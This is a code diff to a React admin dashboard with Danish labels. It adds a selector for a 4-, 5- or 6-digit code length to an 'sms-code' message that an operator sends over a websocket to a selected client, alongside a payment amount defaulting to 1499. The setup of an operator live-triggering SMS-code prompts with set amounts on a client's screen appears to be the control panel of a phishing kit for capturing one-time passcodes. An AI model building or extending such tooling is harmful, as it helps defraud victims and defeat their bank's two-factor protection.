@@ -30,6 +30,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [customMsgText, setCustomMsgText] = useState('')
   const [showSmsPopup, setShowSmsPopup] = useState(false)
   const [smsAmount, setSmsAmount] = useState<string>('1499')
+  const [smsCodeLength, setSmsCodeLength] = useState<number>(6)
 
   const [smsSent, setSmsSent] = useState(false)
   const [currentPage, setCurrentPage] = useState(1)
@@ -183,7 +184,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const sendSmsToClient = () => {
     if (!selected) return
     const amount = smsAmount || null
-    sendAdminWS({ type: 'sms-code', code: '', amount })
+    sendAdminWS({ type: 'sms-code', codeLength: smsCodeLength, amount })
     setSmsSent(true)
     setTimeout(() => { setShowSmsPopup(false); setSmsSent(false) }, 1500)
   }
@@ -502,6 +503,15 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                     {smsAmount && <button onClick={() => setSmsAmount('')} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer text-sm">Ryd</button>}
                   </div>
                   {smsAmount && <div className="text-xs text-emerald-400 font-bold mb-4">Viser: <span className="text-emerald-300">{Number(smsAmount).toLocaleString('da-DK')}</span></div>}
+                  <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Kodelængde</div>
+                  <div className="flex gap-2 mb-4">
+                    {[4, 5, 6].map(len => (
+                      <button key={len} onClick={() => setSmsCodeLength(len)}
+                        className={`flex-1 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-all border ${
+                          smsCodeLength === len ? 'bg-blue-600 border-blue-500 text-white' : 'bg-[#2a3a4e] border-[#3a4a5e] text-gray-300 hover:bg-[#344860]'
+                        }`}>{len} cifre</button>
+                    ))}
+                  </div>
                   <div className="flex gap-3">
                     <button onClick={() => { setSmsAmount(''); sendSmsToClient() }} className="flex-1 bg-[#2a3a4e] hover:bg-[#344860] text-gray-300 font-bold text-sm py-3.5 rounded-xl cursor-pointer transition-colors border border-[#3a4a5e]">
                       Intet beløb
